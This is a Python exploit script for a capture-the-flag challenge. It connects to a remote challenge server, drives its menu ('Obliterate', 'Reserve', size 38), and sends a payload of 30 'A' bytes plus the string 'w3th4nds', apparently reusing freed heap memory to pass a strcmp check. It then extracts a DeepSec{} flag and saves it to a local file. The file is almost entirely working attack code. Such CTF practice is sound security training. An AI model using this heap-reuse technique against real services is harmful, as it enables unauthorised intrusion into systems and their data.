#!/usr/bin/env python3
"""
Slow and careful exploit - wait for prompts
"""

import socket
import time
import re

def wait_for_prompt(s, timeout=2.0):
    """Wait for '>' prompt"""
    s.settimeout(timeout)
    data = b''
    try:
        while b'>' not in data:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
            if b'>' in data:
                break
    except socket.timeout:
        pass
    return data

def exploit_careful():
    host = 'ctf.1337.ma'
    port = 1338
    
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    all_output = b''
    
    # Wait for initial menu
    print("[*] Waiting for initial prompt...")
    data = wait_for_prompt(s, 3.0)
    all_output += data
    print(f"    Received {len(data)} bytes")
    
    # Send obliterate
    print("[*] Sending: 2 (Obliterate)")
    s.sendall(b'2\n')
    data = wait_for_prompt(s, 2.0)
    all_output += data
    print(f"    Received {len(data)} bytes")
    
    # Send reserve space
    print("[*] Sending: 1 (Reserve)")  
    s.sendall(b'1\n')
    time.sleep(0.3)
    data = s.recv(4096)
    all_output += data
    print(f"    Received {len(data)} bytes, looking for size prompt...")
    
    # Send size
    print("[*] Sending: 38")
    s.sendall(b'38\n')
    time.sleep(0.3)
    data = s.recv(4096)
    all_output += data
    print(f"    Received {len(data)} bytes, looking for message prompt...")
    
    # Send payload
    payload = b'A' * 30 + b'w3th4nds\n'
    print(f"[*] Sending payload: {repr(payload)}")
    s.sendall(payload)
    data = wait_for_prompt(s, 2.0)
    all_output += data
    print(f"    Received {len(data)} bytes")
    
    # Send road to salvation
    print("[*] Sending: 3 (Road to salvation)")
    s.sendall(b'3\n')
    
    # Wait for response
    print("[*] Waiting for final response (5 seconds)...")
    time.sleep(5)
    s.settimeout(3.0)
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            all_output += data
            print(f"    Got {len(data)} more bytes...")
    except socket.timeout:
        pass
    except Exception as e:
        print(f"    Connection closed: {e}")
    
    s.close()
    
    output_str = all_output.decode(errors='ignore')
    
    print("\n" + "="*60)
    print("LAST 1500 CHARACTERS OF OUTPUT:")
    print("="*60)
    print(output_str[-1500:])
    
    # Search for flag
    match = re.search(r'DeepSec\{[^}]+\}', output_str)
    if match:
        flag = match.group(0)
        print("\n" + "="*60)
        print(f"[+] FLAG FOUND: {flag}")
        print("="*60)
        with open('/workspaces/ctf/heap_dyl_jumia/FLAG.txt', 'w') as f:
            f.write(flag + '\n')
        return flag
    
    # Check for keywords
    if 'doomed' in output_str.lower() or 'forever' in output_str.lower():
        print("\n[!] Got 'doomed' message - strcmp check failed")
    elif 'success' in output_str.lower():
        print("\n[+] Saw 'success' keyword!")
    elif 'flag' in output_str.lower():
        print("\n[?] Saw 'flag' keyword but no DeepSec{} format")
    else:
        print("\n[-] No success indicators found")
    
    return None

if __name__ == '__main__':
    exploit_careful()
